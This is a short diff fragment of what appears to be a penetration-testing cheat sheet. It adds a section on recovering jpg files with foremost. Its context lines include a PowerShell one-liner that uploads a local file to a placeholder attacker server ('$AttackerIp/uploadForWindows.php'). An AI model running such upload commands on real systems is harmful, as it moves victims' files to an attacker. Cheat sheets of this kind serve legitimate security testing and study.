@@ -215,4 +215,8 @@ and in Powershell:
 PS> powershell (New-Object System.Net.WebClient).UploadFile('http://$AttackerIp/uploadForWindows.php', 'localfileonwindows.txt')
 ```
 
+## File recovery
 
+```
+sudo foremost -v -q -t jpg -i /dev/sdaX -o ./myrecoverydir
+```
